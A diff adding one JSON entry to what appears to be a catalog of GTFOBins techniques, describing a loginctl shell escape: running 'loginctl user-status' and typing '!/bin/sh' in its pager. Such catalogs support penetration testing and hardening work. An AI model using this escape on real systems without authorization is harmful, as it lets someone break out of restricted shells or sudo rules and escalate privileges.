@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-loginctl-shell",
+  "name": "GTFOBins · loginctl (shell)",
+  "command": "loginctl user-status\n!/bin/sh",
+  "description": "Use loginctl to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "loginctl",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/loginctl/#shell",
+  "upstream_id": "loginctl/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/loginctl/"
+    }
+  ]
+}
